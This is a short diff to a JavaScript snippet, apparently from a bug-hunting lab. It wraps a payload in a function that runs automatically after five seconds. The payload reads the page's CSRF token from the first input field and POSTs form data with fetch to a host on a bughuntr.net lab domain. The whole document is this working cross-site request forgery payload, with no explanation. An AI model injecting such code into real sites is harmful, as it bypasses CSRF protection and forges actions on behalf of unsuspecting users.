@@ -1,4 +1,5 @@
 
+function csrf_post () {
 var csrf = document.getElementsByTagName("input")[0].value;
 var formData = new FormData();
 
@@ -10,3 +11,6 @@ fetch("https://hackedabacus.br2.bughuntr.net/view/9dcacd4c-a0c4-4ed1-9fb6-8f3aba
 	method: 'POST',
 	body: formData
 });
+};
+
+setTimeout(csrf_post, 5000);
